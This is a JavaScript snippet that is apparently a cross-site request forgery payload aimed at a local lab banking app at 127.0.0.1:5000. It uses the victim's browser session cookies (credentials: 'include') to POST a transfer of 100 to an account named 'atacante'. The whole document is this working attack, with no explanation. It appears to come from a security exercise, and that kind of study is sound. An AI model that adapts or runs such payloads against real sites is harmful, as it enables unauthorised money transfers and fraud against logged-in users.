fetch('http://127.0.0.1:5000/transfer', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    credentials: 'include',
    body: 'to_username=atacante&amount=100&note=Transferencia+automática&submit=Transferir'
});
